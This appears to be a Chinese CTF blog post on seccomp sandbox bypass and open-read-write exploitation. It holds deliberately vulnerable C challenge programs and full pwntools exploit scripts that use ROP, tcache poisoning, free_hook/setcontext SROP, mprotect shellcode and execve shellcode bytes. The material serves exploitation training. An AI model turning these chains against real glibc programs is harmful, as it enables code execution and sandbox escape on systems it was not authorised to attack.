---
title: sandboxorw总结
date: 2022-04-11 22:54:59 +0800
categories:
  - 漏洞利用总结
tags:
  - pwn
  - ctf
permalink: /posts/id=10/
pin: false
published:
---

## 沙盒绕过

seccomp通常有白名单和黑名单2种

白名单通常较为苛刻，但一般比较少

如果是黑名单

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

只是验证了系统调用号，除了可以orw外，也是可以获取shell的

获取shell有两种方式：

1.execute 520 system call or x32abi (syscall(0x40000000 \| sys_number, arg1, arg2, ...))

2.switch the mode from 64bit to 32bit and execute 32bit shellcode（未验证arch）

除此以外用一些未限制的函数也是可以实现绕过的方式

## setcontext介绍

从mov rsp, [rdi+0xa0]开始，即setcontext+53

这里主要关注一下修改rsp和rcx寄存器的两行代码，mov rsp, [rdi+0xa0]和mov rcx, [rdi+0xa8]。

修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力；修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行截图中最后的retn操作，而retn的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力。

在其payload偏移0xa0和0xa8的位置分别填上我们存储orw链内容的地址和一个ret汇编指令的地址。也可以利用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx。

```python
from pwn import *

context.arch = "amd64"
frame = SigreturnFrame()
frame.rsp = 0xaa # rsp pay+0xa0 这里是orw串的地址，不是orw
frame.rip = 0xbb # rcx pay+0xa8
```

  这里程序流程可以解释如下：执行free或者malloc后跳转到setcontext+53，然后将rsp指针指向orw链，然后修改rcx的值为ret指令的地址，push rcx，至于其它寄存器的值此处可以不用在意，最后执行setcontext末尾后紧邻的retn，栈头出栈也还是ret指令，然后继续弹出，此时的rsp指向的地址正好是orw链的开头。

![setcontext](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/20210627185630879.png)

## shellcode

无保护，题目核心主要是一个read，题目自带jmprsp，考虑利用shellcode进行栈迁移执行shellcode

还有值得注意的点就是在不同的版本的linux，高版本要注意ret栈平衡的问题，即payload比低版本多一个0x8的长度，所以这题在ubuntu16下打的。

![image-20220514105737206](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220514105737206.png)

![image-20220514105140349](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220514105140349.png)

> nop /1字节
>
> pop rdi /1字节
>
> xor esi, esi /2字节 xor rsi, rsi/3字节
>
> sub rsp, 0x30 /4字节
>
> jmp rsp /2字节
>
> mov rax, 0 /7字节 mov eax, 0 /5字节
>
> syscall 2字节

```python
# _*_ coding:utf-8 _*_
from pwn import *
from LibcSearcher import LibcSearcher
context(arch='amd64', os='linux')

p = process('./shellcode')
elf = ELF("./shellcode")
libc = elf.libc
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

'''
0x0000000000400723: pop rdi; ret;
0x0000000000400721: pop rsi; pop r15; ret;
'''
pop_rdi = 0x0000000000400723
pop_rsi_r15 = 0x0000000000400721
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x40068a
jmp_rsp = 0x400685

pop_rdi ='''
nop
nop
nop
nop
nop
pop rdi
pop rdi
ret
'''
# 第一次poprdi把汇编内容填入rdi寄存器，再poprdi就是got表
pay = asm(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)+p64(0)+p64(jmp_rsp)
pay += asm('''
	sub rsp, 0x30
	jmp rsp
	''')

sa("Can u pwn me?",pay)
libc_base = uu64()-libc.sym['puts']
lg('libc_base',libc_base)

bin_sh = libc_base+libc.search("/bin/sh\x00").next()
# jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
lg('bin_sh',bin_sh)

system = '''
xor esi, esi 
xor edx, edx 
mov rax, 520
syscall
nop
nop
nop
'''
pay = asm(pop_rdi)+p64(bin_sh)+p64(jmp_rsp)+asm(system)+p64(jmp_rsp)
pay += asm('''
	sub rsp, 0x30
	jmp rsp
	''')#6

sl(pay)
p.interactive()
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```

## good（栈沙盒）

```c
#include<stdio.h>
#include<fcntl.h>
#include<unistd.h>
#include<stddef.h>
#include<linux/seccomp.h>
#include<linux/filter.h>
#include<sys/prctl.h>    
#include<linux/bpf.h> 
#include<sys/types.h>



void init()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);

}
void sandbox(){
        struct sock_filter filter[] = {
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
        BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
        BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
        };
        struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
        .filter = filter,
        };
        prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
void main()
{
    init();
    sandbox();
    char buf[0x48];
    printf("%s\n","Today is a good day no right man?");
    read(0,buf,0x100);
}
```
编译指令gcc -fno-stack-protector -no-pie -o sandbox sandbox.c
使用方法 seccomp-tools dump ./xxx

```python
from pwn import *
r=process('./good')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('./good')
context.log_level='debug'
'''
0x000000000040083c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400840 : pop r14 ; pop r15 ; ret
0x0000000000400842 : pop r15 ; ret
0x000000000040083b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005f8 : pop rbp ; ret
0x0000000000400843 : pop rdi ; ret
0x0000000000400841 : pop rsi ; pop r15 ; ret 
0x000000000040083d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a
0x0000000000400778 : ret 0x2be


'''
rdi=0x0000000000400843
rsi=0x0000000000400841
r.recv()
#puts(puts_got)
pay='a'*0x58+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x0400790)
r.sendline(pay)
leak=u64(r.recv(6)+'\x00'*2)
print(hex(leak))
libc_base=leak-libc.sym['puts']
print(hex(libc_base))
r.recv()
pay3='a'*0x58+p64(rdi)+p64(0)+p64(rsi)+p64(0x601200)+p64(0x40)+p64(libc_base+libc.sym['read'])+p64(0x0400790)
r.send(pay3)
r.send('flag')

r.recv()
pay1='a'*0x58+p64(rdi)+p64(0x2)+p64(rsi)+p64(0x601200)+p64(0)+p64(libc_base+libc.sym['syscall'])
pay1+=p64(rdi)+p64(3)+p64(rsi)+p64(0x601200)+p64(0x100)+p64(libc_base+libc.sym['read'])
pay1+=p64(rdi)+p64(0x601200)+p64(libc_base+libc.sym['puts'])+p64(0x0400790)
r.send(pay1)
print(r.recvuntil("}"))
```
## orwheap（2.27/堆沙盒）
```c
#include<stdio.h>
#include <math.h>
#include <stdio.h>
#include<unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
void sandbox(){
	struct sock_filter filter[] = {
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
	BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
	BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
	};
	struct sock_fprog prog = {
	.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
	.filter = filter,
	};
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
int init()
{
	setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
int num=0;
char *heaparray[0x10];
size_t realsize[0x10];
void create(){
    if(num>=0x20)
    {
        puts("no more");
        return;
    }
    int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
    heaparray[num]=(char *)malloc(size);
    realsize[num]=size;
    num++;
   
    }
void show(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆块的index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){//根据序列进行查找
        //打印指定堆块内容
        printf("Size : %ld\nContent : %s\n",realsize[idx],heaparray[idx]);
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void edit(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆的序列号
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断序列号的正确性
        puts("Out of bound!");
        _exit(0);
    }
  //若序列号正确
    if(heaparray[idx]){
    	int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
        printf("Content of heap : \n");
        read(0,heaparray[idx],size);
    //调用read_input函数输入堆的内容
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void dele(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断堆块序列的合法性
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        free(heaparray[idx]);//free heaparray[idx]指针
        realsize[idx] = 0 ;
        heaparray[idx]=NULL;
        puts("Done !"); 
        num--;
    }else{
        puts("No such heap !");
    }
}
void menu(void){
	puts("1.create");
	puts("2.dele");
	puts("3.edit");
	puts("4.show");
}
void main()
{
	init();
	sandbox();
	int choice;
	while(1)
	{
		menu();
		scanf("%d",&choice);
		switch(choice)
		{
			case 1:create();break;
			case 2:dele();break;
			case 3:edit();break;
			case 4:show();break;
			default:puts("error");
		}
	}
}
```
edit任意大小修改
2.27使用的是setcontext+53，是利用rdi赋值
抓着free_hook写setcontext

```python
from pwn import *
r=process('./orwheap18')
elf = ELF("orwheap18")
libc= elf.libc
# context.log_level='debug'
context.arch="amd64"
def add(size):
    r.sendlineafter("4.show\n",'1')
    r.sendlineafter("Size of Heap : \n",str(size))

def dele(idx):
    r.sendlineafter("4.show\n",'2')
    r.sendlineafter("Index :\n",str(idx))

def edit(idx,size,con):
    r.sendlineafter("4.show\n",'3')
    r.sendlineafter("Index :\n",str(idx))
    r.sendlineafter("Size of Heap : \n",str(size))
    r.sendafter("Content of heap : \n",con)
def show(idx):
    r.sendlineafter("4.show\n",'4')
    r.sendlineafter("Index :\n",str(idx))
def dbg():
    gdb.attach(r)
    pause() 
# size>0x420不进入tcache
add(0x420)#0
add(0x420)#1
dele(0)
add(0x90)
# 泄露libc
show(1)
r.recvuntil("Content : ")
base=u64(r.recv(6)+b'\x00'*2)-0x3ec090
print(hex(base))
for i in range(9):
    add(0x18)
dele(10)
dele(9)
dele(8)
dele(7)
dele(6)
dele(5)
dele(4)
dele(3)
free_hook=base+libc.sym['__free_hook']
# fastbin里修改fd
edit(2,0x666,b'a'*0x18+p64(0x21)+p64(free_hook-0x10))
for i in range(9):
    add(0x18)
setcontext= base + libc.symbols['setcontext']+53
syscall= base+next(libc.search(asm("syscall\nret")))
edit(11,0x100,p64(setcontext))# 修改free_hook

# 在freehook上方构造
# 设置好srop
fake_rsp = free_hook&0xfffffffffffff000
print(hex(fake_rsp))
frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=fake_rsp
frame.rdx=0x2000
frame.rsp=fake_rsp
frame.rip=syscall
add(0x500)
edit(12,0x500,str(frame))

# 使用free触发，通过setcontext先到rip执行read，然后ret到rsp的值（也就是我们写入的内容）
dele(12)
prdi_ret = base+libc.search(asm("pop rdi\nret")).next()
prsi_ret = base+libc.search(asm("pop rsi\nret")).next()
prdx_ret = base+libc.search(asm("pop rdx\nret")).next()
prax_ret = base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = base+libc.search(asm("jmp rsp")).next()
print("jmp"+hex(jmp_rsp))
mprotect_addr = base + libc.sym['mprotect']

# 这段payload是去查目录确定flag的名称
payload = p64(prdi_ret)+p64(fake_rsp)
payload += p64(prsi_ret)+p64(0x1000)
payload += p64(prdx_ret)+p64(7)
payload += p64(prax_ret)+p64(10)
payload += p64(syscall) #mprotect(fake_rsp,0x1000,7)修改fake_rsp-fake_rsp+0x1000权限
payload += p64(jmp_rsp)# 执行shellcraft
payload += asm(shellcraft.open('./'))
payload += asm(shellcraft.getdents64(3,fake_rsp+0x300,0x100))
payload += asm(shellcraft.write(1,fake_rsp+0x300,0x100))
payload += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (fake_rsp+0x100))# 寄存器赋值，执行read，ret到写入位置执行
r.send(payload)
r.recvuntil("flag")
name=r.recv(6)
print("name"+hex(name))
flag='flag'+name
r.recv()

# cat flag
shellcode = asm(shellcraft.cat(flag))
shellcode+= asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (fake_rsp+0x100))
r.send(shellcode)
print(r.recvuntil("}"))
r.interactive()
```
## orwheap20(2.29/2.31堆沙盒)
```c
#include<stdio.h>
#include <math.h>
#include <stdio.h>
#include<unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
void sandbox(){
	struct sock_filter filter[] = {
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
	BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
	BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
	};
	struct sock_fprog prog = {
	.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
	.filter = filter,
	};
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
int init()
{
	setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
int num=0;
char *heaparray[0x10];
size_t realsize[0x10];
void create(){
    if(num>=0x20)
    {
        puts("no more");
        return;
    }
    int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
    heaparray[num]=(char *)malloc(size);
    realsize[num]=size;
    num++;
   
    }
void show(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆块的index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){//根据序列进行查找
        //打印指定堆块内容
        printf("Size : %ld\nContent : %s\n",realsize[idx],heaparray[idx]);
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void edit(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆的序列号
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断序列号的正确性
        puts("Out of bound!");
        _exit(0);
    }
  //若序列号正确
    if(heaparray[idx]){
    	int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
        printf("Content of heap : \n");
        read(0,heaparray[idx],size);
    //调用read_input函数输入堆的内容
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void dele(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断堆块序列的合法性
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        free(heaparray[idx]);//free heaparray[idx]指针
        realsize[idx] = 0 ;
        heaparray[idx]=NULL;
        puts("Done !"); 
        num--;
    }else{
        puts("No such heap !");
    }
}
void menu(void){
	puts("1.create");
	puts("2.dele");
	puts("3.edit");
	puts("4.show");
}
void main()
{
	init();
	sandbox();
	int choice;
	while(1)
	{
		menu();
		scanf("%d",&choice);
		switch(choice)
		{
			case 1:create();break;
			case 2:dele();break;
			case 3:edit();break;
			case 4:show();break;
			default:puts("error");
		}
	}
}
```
和2.27类似，但setcontext+61采用rdx传参，所以要借助一个gadget，结构有所变化
```python
from pwn import *
r=process('overheap20')
elf = ELF("overheap20")
libc = elf.libc
context.log_level='debug'
context.arch="amd64"

#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
def add(size):
    r.sendlineafter("4.show\n",'1')
    r.sendlineafter("Size of Heap : \n",str(size))

def dele(idx):
    r.sendlineafter("4.show\n",'2')
    r.sendlineafter("Index :\n",str(idx))

def edit(idx,size,con):
    r.sendlineafter("4.show\n",'3')
    r.sendlineafter("Index :\n",str(idx))
    r.sendlineafter("Size of Heap : \n",str(size))
    r.sendafter("Content of heap : \n",con)
def show(idx):
    r.sendlineafter("4.show\n",'4')
    r.sendlineafter("Index :\n",str(idx))
def dbg():
    gdb.attach(r)
    pause()

add(0x420)
add(0x420)
dele(0)
add(0x90)

show(1)
r.recvuntil("Content : ")
base=u64(r.recv(6)+b'\x00'*2)-0x1ebfd0
prdi_ret = base+libc.search(asm("pop rdi\nret")).next()
prsi_ret = base+libc.search(asm("pop rsi\nret")).next()
prdx_ret = base+libc.search(asm("pop rdx\nret")).next()
prax_ret = base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = base+libc.search(asm("jmp rsp")).next()
mprotect_addr = base + libc.sym['mprotect']
print(hex(base))
for i in range(9):
    add(0x18)
dele(10)
dele(9)
dele(8)
dele(7)
dele(6)
dele(5)
dele(4)
dele(3)
free_hook=base+libc.sym['__free_hook']
edit(2,0x666,b'a'*0x18+p64(0x21)+p64(free_hook-0x10))
for i in range(9):
    add(0x18)
# 在此之前，都是为了申请到freehook位置的空间

setcontext= base + libc.symbols['setcontext']+61
syscall= base+next(libc.search(asm("syscall\nret")))
fake_rsp = (free_hook&0xfffffffffffff000)
print(hex(fake_rsp))
shell1 = '''
    xor rdi,rdi
    mov rsi,%d
    mov edx,0x1000

    mov eax,0
    syscall

    jmp rsi
    ''' % fake_rsp
frame = SigreturnFrame()# 设置srop 结合setcontext，先rip跳转mprotect，然后ret跳转rsp
frame.rsp = base + libc.sym['__free_hook']+0x10
frame.rdi = fake_rsp
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = base + libc.sym['mprotect']

# 这里开始泄露堆地址，因为是从tcachebin里申请回来的
show(3)
r.recvuntil("Content : ")
frame_addr=u64(r.recv(6)+b'\x00'*2)+0x770# 加到后边写入的位置
print(hex(frame_addr))

# 把free_hook改为gadget，同时布局上下文
rdxx=0x0000000000154930+base 
edit(11,0x300,p64(rdxx)+p64(0)+p64(base+libc.sym["__free_hook"]+0x18)+asm(shell1))
#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
# gadget:先为rdx赋值(srop)，然后retsetcontext函数
# 执行完srop->ret freehook+0x10（freehook+0x18）->asm(read)
payload1 = p64(0)+p64(frame_addr)#rdx = rdi+0x8
payload1 += p64(0)*4+p64(base+libc.sym["setcontext"]+61) + str(frame)[0x28:]# 前0x28是空的

add(0x500)
edit(12,0x500,payload1)
dele(12)

# 跑目录，catflag
payload=""
payload += asm(shellcraft.open('./'))
payload += asm(shellcraft.getdents64(3,fake_rsp+0x300,0x100))
payload += asm(shellcraft.write(1,fake_rsp+0x300,0x100))
payload += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (fake_rsp+0x100))
r.send(payload)
r.recvuntil("flag")
name=r.recv(6)
flag='flag'+name
shellcode = asm(shellcraft.cat(flag))
shellcode+= asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (fake_rsp+0x100))
r.send(shellcode)

r.interactive()
```
## oldfashion_orw（栈沙盒）
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-98e5a9dcf84e1e1e.png)
泄露libc，改权限，bss上写入shellcode，运行后拿目录，然后重复一次orw拿flag，基本上改完权限就跑板子了，和上一道的区别就是改了权限用shellcode吧

```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("vuln")
elf = ELF('vuln')
libc = elf.libc
'''
0x0000000000401443: pop rdi; ret; 
0x0000000000401441: pop rsi; pop r15; ret;
0x000000000011c371: pop rdx; pop r12; ret; 
0x000000000040101a: ret;

'''
pop_rdi = 0x0000000000401443
pop_rsi_r15 = 0x0000000000401441
ret = 0x000000000040101a
main = 0x401311
bss = 0x404000

payload = 'a'*0x38+p64(pop_rdi)+p64(1)
payload += p64(pop_rsi_r15)+p64(elf.got['write'])+p64(0)
payload += p64(elf.plt['write'])+p64(main)
p.recv()
p.sendline('-1')
p.recv()
p.send(payload)
# p.sendlineafter('size?\n','-1') 
# p.sendafter('content?\n',payload)
ru('!\n')
libc_base = u64(p.recv(6)+'\x00'*2)-libc.sym['write']
lg('libc_base',libc_base)
pop_rdx_r12 = libc_base+0x000000000011c371
payload = 'a'*0x38+p64(pop_rdi)+p64(bss)
payload += p64(pop_rsi_r15)+p64(0x1000)+p64(0)
payload += p64(pop_rdx_r12)+p64(7)+p64(0)+p64(libc_base+libc.sym['mprotect'])
payload += p64(0x401311)

p.recv()
p.sendline('-1')
p.recv()
p.send(payload)
# p.sendlineafter('size?\n','-1') 
# p.sendafter('content?\n',payload)
poc = b'a'*0x38
poc += p64(pop_rdi)
poc += p64(0)
poc += p64(pop_rsi_r15)
poc += p64(bss+0x200)+p64(0)
poc += p64(pop_rdx_r12)
poc += p64(0x100)+p64(0)
poc += p64(libc_base+libc.sym['read'])
poc += p64(bss+0x200)

p.recv()
p.sendline('-1')
p.recv()
p.send(poc)
p.recv()
shellcode = b''
shellcode += asm(shellcraft.open('./'))
shellcode += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
shellcode += asm(shellcraft.write(1,bss+0x300, 0x100))
shellcode += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (0x401311))
p.send(shellcode)
flag=p.recvuntil("flag")
flagname=b'flag'+p.recv(20)
print((flagname))

poc=b'a'*0x38
poc += p64(pop_rdi)
poc += p64(0)
poc += p64(pop_rsi_r15)
poc += p64(bss+0x600)+p64(0)
poc += p64(pop_rdx_r12)
poc += p64(0x100)+p64(0)
poc += p64(libc_base+libc.sym['read'])
poc += p64(bss+0x600)
p.recv()
p.sendline('-1')
p.recv()
p.send(poc)
p.recv()
shellcode = b''
shellcode += asm(shellcraft.open((flagname)))
shellcode += asm(shellcraft.read(4, bss+0x700, 0x400))
shellcode += asm(shellcraft.write(1,bss+0x700, 0x400))
shellcode += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (0x401311))
p.send(shellcode)
p.interactive()
```

## silverwolf(2.27/堆栈转移)

漏洞点是UAF，最大能申请0x78的size，常规思路是覆盖free_hook写setcontext，其实就是去执行写在堆里的gadget，但这道题因为editsize即chunksize，我们用setcontext+srop长度就不够，SigreturnFrame这种都是0xf8往上的，如果硬要在堆里写就需要拼接了。

这里在堆题里用到栈的思想，前置条件是任意地址申请（控制tcache_struct等）。在edit功能结束时会ret，那我们申请堆块到这里的栈空间然后设置ret就可以d达到一个执行gadget的目的

```python
# -*- coding: utf-8 -*-
from pwn import *

p = process('./silverwolf')
elf = ELF("./silverwolf")
libc=elf.libc
context.log_level='debug'
context.arch="amd64"
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

def cmd(choice):
    sla("Your choice: ",choice)

def add(idx,size):
    cmd(1)
    sla("Index: ",idx)
    sla("Size: ",size)

def dele(idx):
    cmd(4)
    sla("Index: ",idx)

def edit(idx,content):
    cmd(2)
    sla("Index: ",idx)
    p.sendlineafter("Content: ",content)

def show(idx):
    cmd(3)
    sla("Index: ",idx)

def dbg():
    gdb.attach(p)
    pause()

# 拿堆地址
add(0,0x8)
dele(0)
edit(0,'a'*8)
show(0)
p.recvuntil("aaaaaaaa")
heap=u64(p.recv(6)+'\x00'*2)-0x10
lg('heap',heap)
edit(0,p64(0))

# 打tcache_struct到unsortbin后获取libc
add(0,0x78)
dele(0)
edit(0,p64(heap+0x10))
add(0,0x78)
add(0,0x78)
edit(0,p64(0)*4+p64(0x0000000007000000))# 7即tcache结构体
dele(0)
show(0)
p.recvuntil("Content: ")
libc_base=u64(p.recv(6)+'\x00'*2)-96-0x3EBC40
lg('libc_base',libc_base)
setcontext= libc_base + libc.symbols['setcontext']+53
free_hook=libc_base+libc.sym['__free_hook']
syscall= libc_base+next(libc.search(asm("syscall\nret")))
pop_rdi_ret = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi_ret = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx_ret = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax_ret = libc_base+libc.search(asm("pop rax\nret")).next()
pop_rsp_ret = libc_base+libc.search(asm("pop rsp\nret")).next()
fake_rsp = free_hook&0xfffffffffffff000

# 泄露栈地址
edit(0,'\x01'*0x60+p64(libc_base+libc.sym["environ"])+p64(libc_base+libc.sym["environ"])+p64(heap+0x10))
add(0,0x68)
show(0)
ru("Content: ")
stack_addr = u64(p.recv(6).ljust(8,"\x00"))
lg("stack_addr",stack_addr)

# 布局申请栈堆
add(0,0x78)
edit(0,'\x01'*0x60+p64(heap+0x10)+p64(libc_base+libc.sym["environ"])+p64(stack_addr-0x120))
add(0,0x78)
payload = p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(fake_rsp)
payload += p64(pop_rdx_ret)+p64(0x1000)+p64(pop_rax_ret)+p64(0)+p64(syscall)+p64(pop_rsp_ret)+p64(fake_rsp)
edit(0,payload)
# orw
payload = [
    pop_rdi_ret,
    fake_rsp+0x100,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    pop_rax_ret,
    2,
    syscall,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    fake_rsp+0x200,
    pop_rdx_ret,
    0x200,
    pop_rax_ret,
    0,
    syscall,
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    fake_rsp+0x200,
    pop_rdx_ret,
    0x100,
    pop_rax_ret,
